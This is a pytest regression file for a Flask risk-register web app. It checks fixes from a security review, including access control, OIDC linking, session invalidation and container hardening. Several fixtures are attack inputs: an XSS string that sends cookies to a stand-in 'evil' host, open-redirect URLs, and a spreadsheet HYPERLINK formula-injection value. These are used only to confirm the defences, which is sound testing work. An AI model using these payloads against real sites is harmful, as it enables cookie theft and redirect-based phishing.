"""Regression tests for the 2026-10-16 pre-push review (REVIEW-2026-10-16.md).

Each test names the review item it holds in place. If one fails, read that
section of the review before changing the test.
"""

import os
import re
import sys
import tempfile
from datetime import date, timedelta

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

ADMIN_PW = "Sm0ke-Test-Password!"
OPERATOR_PW = "Operator-Password-123"


def _make_app(**overrides):
    tmp = tempfile.mkdtemp()
    from app import create_app
    from app.config import Config

    attrs = dict(
        SECRET_KEY="test-key-" + "z" * 40,
        SQLALCHEMY_DATABASE_URI=f"sqlite:///{tmp}/sec.db",
        SESSION_COOKIE_SECURE=False,
        REMEMBER_COOKIE_SECURE=False,
        WTF_CSRF_ENABLED=False,
        TESTING=True,
        ADMIN_EMAIL="admin@example.org",
        ADMIN_USERNAME="admin",
        ADMIN_PASSWORD=ADMIN_PW,
        SMTP_HOST="",
        SPOTLIGHT_SYNC_ENABLED=False,
        FALCON_CLIENT_ID="",
        FALCON_CLIENT_SECRET="",
        RATELIMIT_ENABLED=False,
    )
    attrs.update(overrides)
    return create_app(type("TestConfig", (Config,), attrs))


@pytest.fixture
def app():
    return _make_app()


def _login(client, username="admin", password=ADMIN_PW):
    return client.post("/login", data={"username": username, "password": password})


def _make_operator(app, username="op", name="Op Erator"):
    from app.models import User, db
    with app.app_context():
        u = User(username=username, email=f"{username}@example.org", name=name,
                 role="operator", is_active=True)
        u.set_password(OPERATOR_PW)
        db.session.add(u)
        db.session.commit()
        return u.id


def _make_risk(app, created_by_id=None, **fields):
    from app.models import Risk, db
    with app.app_context():
        n = Risk.query.count() + 1
        r = Risk(risk_id=f"SKR-{n:03d}", created_by_id=created_by_id,
                 likelihood=3, impact=3, **fields)
        db.session.add(r)
        db.session.commit()
        return r.id


# ── 1.1 ─────────────────────────────────────────────────────────────────────
def test_1_1_deleting_a_risk_keeps_its_audit_trail(app):
    from app.models import AuditLog, Risk, db
    c = app.test_client()
    _login(c)
    c.post("/risks/new", data={"threat_description": "t", "likelihood": "3",
                               "impact": "3", "status": "Open"})
    with app.app_context():
        risk = Risk.query.first()
        pk, ref = risk.id, risk.risk_id
        before = AuditLog.query.filter_by(risk_id=pk).count()
        assert before >= 1

    resp = c.post(f"/risks/{pk}/delete")
    assert resp.status_code == 302

    with app.app_context():
        assert db.session.get(Risk, pk) is None
        deleted = AuditLog.query.filter_by(action="deleted").one()
        assert deleted.old_value == ref
        rows = AuditLog.query.filter_by(risk_id=-deleted.id).all()
        assert len(rows) == before + 1, "existing audit rows must survive the delete"


def test_1_1_a_reused_id_does_not_inherit_old_history(app):
    """SQLite reuses the highest row id after a delete. The next risk must
    start with a clean trail, not the deleted risk's."""
    from app.models import AuditLog, Risk
    c = app.test_client()
    _login(c)
    c.post("/risks/new", data={"likelihood": "3", "impact": "3", "status": "Open"})
    with app.app_context():
        pk = Risk.query.first().id
    c.post(f"/risks/{pk}/delete")
    c.post("/risks/new", data={"likelihood": "2", "impact": "2", "status": "Open"})
    with app.app_context():
        new = Risk.query.first()
        assert new.id == pk, "precondition: SQLite reused the id"
        assert [a.action for a in AuditLog.query.filter_by(risk_id=new.id)] == ["created"]


def test_1_1_operators_cannot_delete(app):
    op_id = _make_operator(app)
    pk = _make_risk(app, created_by_id=op_id)
    c = app.test_client()
    _login(c, "op", OPERATOR_PW)
    assert c.post(f"/risks/{pk}/delete").status_code == 403


# ── 1.2 ─────────────────────────────────────────────────────────────────────
class _FakeOIDC:
    def __init__(self, userinfo):
        self._userinfo = userinfo

    def authorize_access_token(self):
        return {"userinfo": self._userinfo}


class _FakeOAuth:
    def __init__(self, userinfo):
        self.oidc = _FakeOIDC(userinfo)


def _oidc_login(app, userinfo):
    app.extensions["oauth"] = _FakeOAuth(userinfo)
    return app.test_client().get("/auth/oidc/callback")


def test_1_2_unverified_email_does_not_take_over_local_admin(app):
    from app.models import User
    resp = _oidc_login(app, {"sub": "attacker-sub", "email": "admin@example.org",
                             "name": "Mallory"})
    assert resp.status_code == 302 and "/login" in resp.headers["Location"]
    with app.app_context():
        admin = User.query.filter_by(email="admin@example.org").first()
        assert admin.oidc_sub is None


def test_1_2_verified_email_links_once(app):
    from app.models import User
    resp = _oidc_login(app, {"sub": "real-sub", "email": "admin@example.org",
                             "email_verified": True, "name": "Admin"})
    assert resp.status_code == 302 and "/login" not in resp.headers["Location"]
    with app.app_context():
        assert User.query.filter_by(email="admin@example.org").first().oidc_sub == "real-sub"

    # a second identity claiming the same verified email cannot re-point it
    resp = _oidc_login(app, {"sub": "other-sub", "email": "admin@example.org",
                             "email_verified": True})
    assert "/login" in resp.headers["Location"]
    with app.app_context():
        assert User.query.filter_by(email="admin@example.org").first().oidc_sub == "real-sub"


def test_1_2_token_without_sub_is_refused(app):
    resp = _oidc_login(app, {"email": "new@example.org", "email_verified": True})
    assert "/login" in resp.headers["Location"]


# ── 1.4 ─────────────────────────────────────────────────────────────────────
PAYLOAD = "x');fetch('//evil/'+document.cookie);//"


def test_1_4_stored_values_never_land_inside_inline_js(app):
    from app.models import VulnerabilityFinding, db
    pk = _make_risk(app)
    with app.app_context():
        db.session.add(VulnerabilityFinding(risk_id=pk, cve_id=PAYLOAD, status="Open"))
        db.session.commit()
    _make_operator(app, username="evil", name=PAYLOAD)

    c = app.test_client()
    _login(c)
    for path in (f"/risks/{pk}", "/users/", "/settings/"):
        body = c.get(path).get_data(as_text=True)
        assert not re.search(r"<form[^>]*\bonsubmit=", body), \
            f"{path} still has an inline onsubmit handler"
    body = c.get(f"/risks/{pk}").get_data(as_text=True)
    assert 'data-confirm="Remove x&#39;);fetch(' in body
    assert "getAttribute('data-confirm')" in body


# ── 1.5 ─────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("target", [
    "https://evil.example", "//evil.example", "/\\evil.example",
    "/\t/evil.example", "javascript:alert(1)",
])
def test_1_5_triage_back_cannot_leave_the_site(app, target):
    c = app.test_client()
    _login(c)
    resp = c.post("/ingest/triage", data={"back": target})
    loc = resp.headers["Location"]
    assert "evil" not in loc and "javascript" not in loc
    assert loc.endswith("/ingest/")


def test_1_5_triage_back_keeps_local_paths(app):
    c = app.test_client()
    _login(c)
    resp = c.post("/ingest/triage", data={"back": "/ingest/findings?kev=1"})
    assert resp.headers["Location"].endswith("/ingest/findings?kev=1")


def test_1_5_login_next_is_hardened_too(app):
    c = app.test_client()
    resp = c.post("/login?next=/\\evil.example",
                  data={"username": "admin", "password": ADMIN_PW})
    assert "evil" not in resp.headers["Location"]


# ── 1.6 ─────────────────────────────────────────────────────────────────────
def test_1_6_dockerignore_keeps_secrets_and_data_out():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    lines = open(os.path.join(root, ".dockerignore")).read().splitlines()
    for required in (".env", "data/", "*.db", ".git/"):
        assert required in lines


# ── 2.1 ─────────────────────────────────────────────────────────────────────
def test_2_1_smtp_verifies_the_server_certificate(app, monkeypatch):
    import ssl
    import smtplib
    seen = {}

    class FakeSMTP:
        def __init__(self, host, port):
            seen["connected"] = True

        def starttls(self, context=None):
            seen["context"] = context

        def login(self, *a):
            raise smtplib.SMTPAuthenticationError(535, b"no")

        def quit(self):
            seen["quit"] = True

    monkeypatch.setattr(smtplib, "SMTP", FakeSMTP)
    app.config.update(SMTP_HOST="mail.example", SMTP_USER="u", SMTP_PASSWORD="p")
    from app.email_utils import _send
    with app.app_context():
        _send(["a@example.org"], "s", "b")
    ctx = seen["context"]
    assert ctx is not None and ctx.verify_mode == ssl.CERT_REQUIRED and ctx.check_hostname
    assert seen.get("quit"), "connection must be closed even when login fails"


def test_2_1_plain_text_email_is_not_html_escaped():
    from app.email_utils import OVERDUE_TEMPLATE

    class R:
        risk_id, id, risk_category = "SKR-001", 1, "Data"
        threat_description = "Backups & restores <untested>"
        action_owner, due_date, days_overdue = "Ted", date(2026, 1, 1), 3

    body = OVERDUE_TEMPLATE.render(risk=R, base_url="https://x")
    assert "Backups & restores <untested>" in body
    assert "Subject:" not in body


# ── 2.2 ─────────────────────────────────────────────────────────────────────
def test_2_2_excel_export_stores_formulas_as_text(app):
    import io
    from openpyxl import load_workbook
    _make_risk(app, threat_description='=HYPERLINK("http://evil.example","x")')
    c = app.test_client()
    _login(c)
    wb = load_workbook(io.BytesIO(c.get("/export/excel").data))
    ws = wb["Risk Register"]
    cell = next(cl for row in ws.iter_rows() for cl in row
                if isinstance(cl.value, str) and cl.value.startswith("=HYPERLINK"))
    assert cell.data_type == "s"
    assert all(cl.data_type != "f" for sh in wb.worksheets
               for row in sh.iter_rows() for cl in row)


# ── 2.3 ─────────────────────────────────────────────────────────────────────
def test_2_3_notifications_only_reach_active_users(app):
    from app.email_utils import _emails_for_name
    with app.app_context():
        assert _emails_for_name("outside@evil.example") == []
        assert _emails_for_name("%") == []
        assert _emails_for_name("_dministrator") == []
        assert _emails_for_name("administrator") == ["admin@example.org"]
        assert _emails_for_name("ADMIN@example.org") == ["admin@example.org"]


# ── 2.4 ─────────────────────────────────────────────────────────────────────
def test_2_4_operator_cannot_change_someone_elses_risk(app):
    from app.models import VulnerabilityFinding, db
    _make_operator(app)
    pk = _make_risk(app, risk_owner="Somebody Else")
    with app.app_context():
        v = VulnerabilityFinding(risk_id=pk, cve_id="CVE-1", status="Open")
        db.session.add(v)
        db.session.commit()
        vid = v.id
    c = app.test_client()
    _login(c, "op", OPERATOR_PW)
    assert c.post(f"/risks/{pk}/trend", data={}).status_code == 403
    assert c.post(f"/risks/{pk}/vulnerability", data={"cve_id": "CVE-2"}).status_code == 403
    assert c.post(f"/risks/{pk}/vulnerability/{vid}/delete").status_code == 403
    assert c.get(f"/risks/{pk}/decision-request").status_code == 403
    assert c.get(f"/risks/{pk}/edit").status_code == 403


def test_2_4_operator_can_change_a_risk_they_own(app):
    _make_operator(app, name="Op Erator")
    pk = _make_risk(app, risk_owner="op erator")
    c = app.test_client()
    _login(c, "op", OPERATOR_PW)
    assert c.post(f"/risks/{pk}/vulnerability", data={"cve_id": "CVE-9"}).status_code == 302
    assert c.post(f"/risks/{pk}/trend", data={}).status_code == 302


# ── 2.5 ─────────────────────────────────────────────────────────────────────
def test_2_5_password_change_ends_existing_sessions(app):
    op_id = _make_operator(app)
    victim = app.test_client()
    _login(victim, "op", OPERATOR_PW)
    assert victim.get("/risks/").status_code == 200

    admin = app.test_client()
    _login(admin)
    admin.post(f"/users/{op_id}/edit", data={
        "role": "operator", "is_active": "on", "name": "Op Erator",
        "password": "A-brand-new-password-1"})

    resp = victim.get("/risks/")
    assert resp.status_code == 302 and "/login" in resp.headers["Location"]


def test_2_5_pre_upgrade_session_ids_are_refused(app):
    c = app.test_client()
    with c.session_transaction() as s:
        s["_user_id"] = "1"          # the old format: a bare id
        s["_fresh"] = True
    assert c.get("/risks/").status_code == 302


# ── 2.6 ─────────────────────────────────────────────────────────────────────
def test_2_6_container_drops_root_before_the_app_starts():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    dockerfile = open(os.path.join(root, "Dockerfile")).read()
    entry = open(os.path.join(root, "docker-entrypoint.sh")).read()
    assert 'ENTRYPOINT ["sh", "/app/docker-entrypoint.sh"]' in dockerfile
    assert "su-exec" in dockerfile and "adduser -S -D -H -u 10001" in dockerfile
    # The only root-time work is taking ownership of the data dir; then exec
    # as the app user. Nothing may run between the chown and the exec.
    body = [ln.strip() for ln in entry.splitlines()
            if ln.strip() and not ln.strip().startswith("#")]
    i = body.index('chown -R "$APP_USER:$APP_USER" "$DATA_DIR"')
    assert body[i + 1] == 'exec su-exec "$APP_USER" "$@"'
    # and the entrypoint is not excluded from the build context
    assert "docker-entrypoint.sh" not in open(os.path.join(root, ".dockerignore")).read()


# ── 2.7 ─────────────────────────────────────────────────────────────────────
def test_2_7_every_external_asset_is_pinned():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    tags = []
    for dirpath, _d, files in os.walk(os.path.join(root, "app", "templates")):
        for f in files:
            if f.endswith(".html"):
                text = open(os.path.join(dirpath, f)).read()
                tags += re.findall(r'<(?:script|link)[^>]*(?:src|href)="https?://[^>]*>', text)
    assert tags, "expected CDN tags to check"
    for tag in tags:
        assert 'integrity="sha384-' in tag and 'crossorigin="anonymous"' in tag, tag
        assert "unpkg.com" not in tag and "chart.umd.min.js" not in tag, tag


# ── 3 ───────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("url", [
    "http://api.crowdstrike.com", "https://evil.example",
    "https://api.crowdstrike.com.evil.example", "https://crowdstrike.com@evil.example",
])
def test_3_falcon_base_url_must_be_a_crowdstrike_host(url):
    from app.spotlight.client import FalconSpotlightClient, SpotlightError
    with pytest.raises(SpotlightError, match="FALCON_BASE_URL"):
        FalconSpotlightClient("id", "secret", base_url=url)


def test_3_falcon_base_url_accepts_real_hosts():
    from app.spotlight.client import FalconSpotlightClient
    for url in ("https://api.us-2.crowdstrike.com", "https://api.us-gov-2.crowdstrike.mil"):
        assert FalconSpotlightClient("id", "secret", base_url=url).base_url == url


def test_3_db_import_error_does_not_leak_exception_text(app, monkeypatch):
    import io
    import app.routes.settings_routes as sr
    monkeypatch.setattr(sr.sqlite3, "connect",
                        lambda *_a, **_k: (_ for _ in ()).throw(RuntimeError("SECRET-PATH /x/y")))
    c = app.test_client()
    _login(c)
    resp = c.post("/settings/db/import", follow_redirects=True,
                  data={"db_file": (io.BytesIO(b"SQLite format 3\x00" + b"\x00" * 100), "x.db")},
                  content_type="multipart/form-data")
    assert b"SECRET-PATH" not in resp.data
    assert b"previous database is unchanged" in resp.data


# ── 5 ───────────────────────────────────────────────────────────────────────
def test_5_never_reviewed_risks_still_come_due():
    from app.email_utils import review_due

    class R:
        review_frequency = "Monthly"
        last_reviewed = None
        date_identified = date.today() - timedelta(days=40)

    assert review_due(R, date.today())


def test_5_password_is_used_exactly_as_typed(app):
    from app.models import User
    c = app.test_client()
    _login(c)
    c.post("/users/new", data={"username": "spacey", "email": "s@example.org",
                               "name": "Spacey", "role": "viewer",
                               "password": "  leading-and-trailing  "})
    with app.app_context():
        assert User.query.filter_by(username="spacey").first() is not None
    c2 = app.test_client()
    resp = _login(c2, "spacey", "  leading-and-trailing  ")
    assert resp.status_code == 302 and "/login" not in resp.headers["Location"]


def test_5_blank_name_and_bogus_status_are_rejected(app):
    from app.models import Risk, User, db
    op_id = _make_operator(app)
    c = app.test_client()
    _login(c)
    c.post(f"/users/{op_id}/edit", data={"role": "operator", "is_active": "on", "name": "   "})
    c.post("/risks/new", data={"likelihood": "2", "impact": "2", "status": "Pwned"})
    with app.app_context():
        assert db.session.get(User, op_id).name == "Op Erator"
        assert Risk.query.order_by(Risk.id.desc()).first().status == "Open"


def test_6_scores_come_from_scoring_module(app):
    from app import scoring
    from app.models import Risk
    with app.app_context():
        for lik, imp, ce in [(5, 5, None), (4, 3, 2), (2, 2, 5), (None, 3, 3)]:
            r = Risk(likelihood=lik, impact=imp, control_effectiveness=ce)
            assert r.residual_risk_score == scoring.residual_score(lik, imp, ce)
            assert r.rag_status == scoring.rag_status(r.residual_risk_score, 15, 9)


def test_1_1_deleted_risk_does_not_leave_spotlight_links_dangling(app):
    import json
    from app.models import Risk, db
    from app.models_spotlight import SpotlightElevation, SpotlightFinding
    from app.spotlight.ingest import upsert_finding, upsert_host

    here = os.path.dirname(os.path.abspath(__file__))
    payload = json.load(open(os.path.join(here, "sample_spotlight_payload.json")))
    with app.app_context():
        for record in payload["resources"]:
            host, _ = upsert_host(record)
            if host is not None and host.id is None:
                db.session.flush()
            upsert_finding(record, host)
        db.session.commit()
        ids = [f.id for f in SpotlightFinding.query.filter_by(aid="abc123def456")]

    c = app.test_client()
    _login(c)
    c.post("/ingest/elevate", data={"finding_ids": ids, "likelihood": "4", "impact": "4"})
    with app.app_context():
        pk = Risk.query.one().id
    c.post(f"/risks/{pk}/delete")
    c.post("/risks/new", data={"likelihood": "1", "impact": "1", "status": "Open"})

    with app.app_context():
        assert Risk.query.one().id == pk, "precondition: SQLite reused the id"
        elevation = SpotlightElevation.query.one()
        assert elevation.risk is None, "elevation must not resolve to the new, unrelated risk"
        assert elevation.risk_ref.startswith("SKR-")
        assert all(f.risk_id is None and f.vuln_finding_id is None
                   for f in SpotlightFinding.query.filter(SpotlightFinding.id.in_(ids)))


# ── Dashboard heat map ──────────────────────────────────────────────────────
def test_heat_map_shows_every_risk_under_its_current_label(app):
    """Green-labeled risks must be visible as green, wherever they sit.

    A risk's label comes from its residual score (after controls); its cell
    comes from likelihood x impact (before controls). A controlled risk sits
    in a red cell but must still be counted as green, and the green zone must
    be drawn even when empty.
    """
    from app.models import Risk, db
    with app.app_context():
        db.session.add_all([
            Risk(risk_id="SKR-001", likelihood=2, impact=2),                           # green cell, green label
            Risk(risk_id="SKR-002", likelihood=4, impact=4, control_effectiveness=5),  # red cell, green label
            Risk(risk_id="SKR-003", likelihood=5, impact=5),                           # red cell, red label
            Risk(risk_id="SKR-004", likelihood=None, impact=3),                        # cannot be placed
        ])
        db.session.commit()
    c = app.test_client()
    _login(c)
    html = c.get("/dashboard").get_data(as_text=True)
    cells = re.findall(r'<div class="heat-cell heat-zone-(\w+)"\s+title="([^"]+)">\s*(.*?)\s*</div>',
                       html, re.S)
    assert len(cells) == 25
    assert sum(1 for z, _t, _i in cells if z == "GREEN") == 14, "green zone drawn even when empty"

    def chips(lik, imp):
        inner = next(i for _z, t, i in cells if t.startswith(f"Likelihood {lik} x Impact {imp} "))
        return dict((rag, int(n)) for rag, n in re.findall(r'heat-chip-(\w+)">(\d+)<', inner))

    assert chips(2, 2) == {"GREEN": 1}
    assert chips(4, 4) == {"GREEN": 1}, "controlled risk shows green inside the red zone"
    assert chips(5, 5) == {"RED": 1}
    assert "1 risk not shown: likelihood or impact not set." in html


def test_heat_map_leaves_out_closed_risks(app):
    from app.models import Risk, db
    with app.app_context():
        db.session.add_all([
            Risk(risk_id="SKR-001", likelihood=5, impact=5, status="Open"),
            Risk(risk_id="SKR-002", likelihood=5, impact=5, status="Closed"),
            Risk(risk_id="SKR-003", likelihood=5, impact=5, status="Accepted"),
            Risk(risk_id="SKR-004", likelihood=None, impact=2, status="Closed"),
        ])
        db.session.commit()
    c = app.test_client()
    _login(c)
    html = c.get("/dashboard").get_data(as_text=True)
    cell = re.search(r'title="Likelihood 5 x Impact 5 [^"]*">\s*(.*?)\s*</div>', html, re.S).group(1)
    assert re.findall(r'heat-chip-(\w+)">(\d+)<', cell) == [("RED", "2")], \
        "open and accepted count; closed does not"
    assert "not shown: likelihood or impact not set" not in html, \
        "a closed risk with no likelihood is not reported as missing"


def test_heat_map_zones_follow_configured_thresholds():
    app = _make_app(RAG_RED_THRESHOLD=20, RAG_AMBER_THRESHOLD=10)
    c = app.test_client()
    _login(c)
    html = c.get("/dashboard").get_data(as_text=True)
    zones = {t: z for z, t in re.findall(r'heat-zone-(\w+)"\s+title="Likelihood (\d x Impact \d)', html)}
    assert zones["4 x Impact 4"] == "AMBER"   # 16: red at the default 15, amber at 20
    assert zones["3 x Impact 3"] == "GREEN"   # 9: amber at the default 9, green at 10
    assert zones["4 x Impact 5"] == "RED"     # 20
